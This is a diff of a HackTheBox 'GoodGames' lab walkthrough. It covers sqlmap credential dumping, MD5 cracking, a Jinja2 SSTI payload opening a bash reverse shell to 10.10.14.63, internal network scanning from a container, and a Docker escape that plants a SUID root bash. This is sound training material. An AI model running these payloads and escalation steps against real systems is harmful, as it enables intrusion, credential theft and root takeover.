@@ -5,56 +5,60 @@
 | Platform   | HackTheBox         |
 | OS         | Linux              |
 | Difficulty | Easy               |
-| Tags       | SQLi, SSTI, Docker escape, SUID |
+| Tags       | SQLi, SSTI, Docker escape, SUID, Internal network pivoting |
 
 ---
 
 ## 1. Reconnaissance
 
-Port scan revealed port 80 (HTTP) open.
-
 ```bash
-nmap -sV -p- --min-rate 5000 <IP>
+nmap -sV -sC 10.129.33.160
 ```
 
-![nmap scan results](screenshots/nmap-scan.png)
+Only port 80 open — HTTP, video game community/store.
 
-![Web homepage — GoodGames portal](screenshots/web-homepage.png)
+![nmap scan — port 80 only](screenshots/nmap-scan.png)
+
+![Web homepage — GoodGames store](screenshots/web-homepage.png)
 
 ---
 
-## 2. Foothold — SQL Injection
+## 2. SQL Injection
 
-The main login page was not vulnerable to SQLi. Clicking **Sign Up** redirected to a different login panel, which was injectable.
+Navigated to the login page. Captured the POST request with Burp Suite before attempting to register.
 
-![Vulnerable login panel](screenshots/login-sqli-vulnerable.png)
+![Login page](screenshots/login-sqli-vulnerable.png)
 
-Captured the POST request with Burp and ran sqlmap:
+![Burp capture of login request](screenshots/burp-capture.png)
+
+Saved the request as `sqlfile` and ran sqlmap:
 
 ```bash
 # Enumerate databases
-sqlmap -r request.txt --batch --dbs
+sqlmap -r sqlfile --dbs --batch
 ```
 
-![sqlmap — databases](screenshots/sqlmap-dbs.png)
+![sqlmap request loaded](screenshots/sqlmap-request.png)
+
+![sqlmap — databases found](screenshots/sqlmap-dbs.png)
 
 ```bash
-# Enumerate tables in main DB
-sqlmap -r request.txt --batch -D main --tables
+# Enumerate tables
+sqlmap -r sqlfile -D main --tables --batch
 ```
 
 ![sqlmap — tables](screenshots/sqlmap-tables.png)
 
 ```bash
 # Dump credentials
-sqlmap -r request.txt --batch -D main -T user -C "email,password" --dump
+sqlmap -r sqlfile -D main -T user -C "email,password" --dump --batch
 ```
 
 ![sqlmap — credentials dumped](screenshots/sqlmap-dump.png)
 
 Obtained: `admin@goodgames.htb` | `2b22337f218b2d82dfc3b6f77e7cb8ec`
 
-Cracked with hashcat (MD5):
+Cracked the MD5 hash with hashcat:
 
 ```bash
 hashcat -m 0 2b22337f218b2d82dfc3b6f77e7cb8ec /usr/share/wordlists/rockyou.txt
@@ -63,19 +67,25 @@ hashcat -m 0 2b22337f218b2d82dfc3b6f77e7cb8ec /usr/share/wordlists/rockyou.txt
 
 ---
 
-## 3. Internal Admin Panel
+## 3. Admin Panel & Internal Subdomain Discovery
 
-Logged in as admin with `superadministrator`.
+Logged in as `admin` / `superadministrator`.
 
 ![Admin login](screenshots/admin-login.png)
 
 ![Admin panel](screenshots/admin-panel.png)
 
-Clicking the gear icon redirected to an internal host: `internal-administration.goodgames.htb`.
+The dashboard had nothing interesting. Checked the **page source** of the admin profile page — found a hidden subdomain URL embedded in the source code.
+
+```
+http://internal-administration.goodgames.htb
+```
+
+![Source code revealing internal subdomain](screenshots/source-code-subdomain.png)
 
 ![Settings gear redirect](screenshots/settings-gear-redirect.png)
 
-Added the hostname to `/etc/hosts`:
+Added to `/etc/hosts`:
 
 ```
 <IP>  goodgames.htb internal-administration.goodgames.htb
@@ -83,60 +93,97 @@ Added the hostname to `/etc/hosts`:
 
 ![/etc/hosts entry](screenshots/etc-hosts-entry.png)
 
+Accessed the internal panel — a Flask Volt admin interface with its own login.
+
 ![Internal admin panel](screenshots/internal-admin-panel.png)
 
-Credential reuse worked — same `admin` / `superadministrator` authenticated to the internal panel.
+Credential reuse worked: `admin` / `superadministrator`.
 
-![Credential reuse attempt](screenshots/credential-reuse.png)
+![Credential reuse](screenshots/credential-reuse.png)
 
 ![Logged into internal panel](screenshots/internal-logged-in.png)
 
 ---
 
-## 4. RCE via SSTI
+## 4. Server-Side Template Injection (SSTI)
 
-The profile name field in the internal panel was vulnerable to Server-Side Template Injection (Flask/Jinja2).
+The profile **Full Name** field reflected user input through a Jinja2 template engine. Tested for SSTI:
 
-Tested with `{{7*7}}` — rendered `49`, confirming SSTI.
+```
+Detection payload: {{5*5}}
+```
 
-![SSTI test confirmation](screenshots/ssti-test.png)
+![SSTI detection payload](screenshots/ssti-detection.png)
 
-Triggered a reverse shell:
+![SSTI confirmed — output: 25](screenshots/ssti-confirmed.png)
+
+Set up a netcat listener:
 
 ```bash
-nc -lvnp 4444
+nc -lvp 4444
 ```
+
+![Netcat listener ready](screenshots/netcat-listener.png)
+
+Injected reverse shell payload into the Full Name field:
 
 ```
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.63/4444 0>&1"').read() }}
 ```
 
+![Reverse shell payload injected](screenshots/reverse-shell-payload.png)
+
 ![RCE — reverse shell received](screenshots/rce-shell.png)
 
-Shell landed as `root` inside a Docker container.
+Shell landed as `root` — but inside a Docker container, not the real host.
 
 ![Docker container detected](screenshots/docker-detected.png)
 
----
-
-## 5. Docker Escape
-
-### Step 1 — Identify host IP and mounted directory
-
-Inside the container, checked the default gateway to find the host:
+### User Flag
 
 ```bash
-ip route
-# default via 172.19.0.1
+cat /home/augustus/user.txt
 ```
 
-Found that `/home/augustus` from the host was mounted inside the container — the home directory was accessible and writable.
+![User flag](screenshots/user-flag.png)
 
-![Mount discovery](screenshots/docker-mount-discovery.png)
+---
+
+## 5. Privilege Escalation — Docker Escape
+
+### Step 1 — Enumerate the internal network
+
+A `Dockerfile` was found in `/backend`, confirming Docker usage. Checked the network interface:
+
+```bash
+ip addr
+# 172.19.0.2/16 — internal Docker network
+```
+
+Downloaded a static nmap binary to scan the internal network from the container:
+
+```bash
+# On Kali
+python3 -m http.server 80
+
+# On target
+wget 10.10.14.63/nmap
+chmod +x nmap
+
+# Scan for live hosts
+./nmap -sn 172.19.0.0/16
+# Found: 172.19.0.1 (host)
+
+# Port scan the host
+./nmap 172.19.0.1 -v
+# Ports open: 22 (SSH), 80 (HTTP)
+```
+
+![Static nmap — host 172.19.0.1 discovered](screenshots/nmap-static-scan.png)
 
 ### Step 2 — SSH to host as augustus
 
-The password `superadministrator` was reused. SSHed directly to the host:
+Tried the same password via SSH to the host:
 
 ```bash
 ssh augustus@172.19.0.1
@@ -145,20 +192,30 @@ ssh augustus@172.19.0.1
 
 ![SSH to host as augustus](screenshots/ssh-augustus-host.png)
 
-### Step 3 — Plant SUID bash via Docker
+### Step 3 — Plant SUID bash from Docker
 
-Back inside the container (running as `root`), copied bash into augustus's home directory and set the SUID bit:
+Augustus's home directory (`/home/augustus`) was mounted inside the Docker container. As Docker root, we could write files that would be accessible on the host with root ownership.
+
+From the Docker root shell:
 
 ```bash
+# Copy bash binary into the mounted home directory
 cp /bin/bash /home/augustus/bash
-chmod +s /home/augustus/bash
+
+# Set root ownership
+chown root:root /home/augustus/bash
+
+# Set SUID bit + full permissions
+chmod 4777 /home/augustus/bash
 ```
 
-![SUID bash planted](screenshots/bash-suid-copy.png)
+![SUID bash planted with correct permissions](screenshots/bash-suid-copy.png)
+
+**Why this works:** Augustus cannot change ownership or set SUID on the host (low-privileged user). But from Docker root, we write files with root ownership into the shared mount. The host sees the file as owned by root with SUID set — so executing it spawns a root shell.
 
 ### Step 4 — Execute SUID bash on host
 
-From the SSH session as `augustus` on the host:
+Back in the augustus SSH session on the host:
 
 ```bash
 ./bash -p
@@ -167,14 +224,22 @@ From the SSH session as `augustus` on the host:
 
 ![Root shell on host](screenshots/root.png)
 
+```bash
+cat /root/root/root.txt
+```
+
 ---
 
 ## 6. Key Takeaways
 
-**Multiple login panels may have different security postures** — the public panel was hardened, the internal one was not. Always test every auth form found after initial access.
+**Check page source for hidden subdomains** — the internal admin URL was only visible in the HTML source, not linked from the UI.
 
-**Credential reuse is extremely common** — admins reuse passwords across services. Any credential recovered should be tested against SSH, internal panels, and other services immediately.
+**Credential reuse across internal services** — any credential recovered should be tested against SSH and all web panels found.
 
-**SSTI in Jinja2 → RCE** — `{{ self.__init__.__globals__.__builtins__.__import__('os').popen(...).read() }}` is a reliable payload when filters are absent.
+**SSTI in Jinja2** — `{{5*5}}` confirms injection. Escalate to RCE with `os.popen(...)`. Reference: [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
 
-**Docker escape via mounted home directory** — if the host's user home is mounted inside the container and you are root inside Docker, you can write a SUID binary into the mounted directory. On the host, the binary runs with SUID root.
+**Docker escape via mounted home directory:**
+1. Identify mounted host directories (`/home/augustus` accessible inside container)
+2. SSH to host as low-priv user using reused credentials
+3. From Docker root: `cp /bin/bash`, `chown root:root bash`, `chmod 4777 bash`
+4. On host: `./bash -p` → root
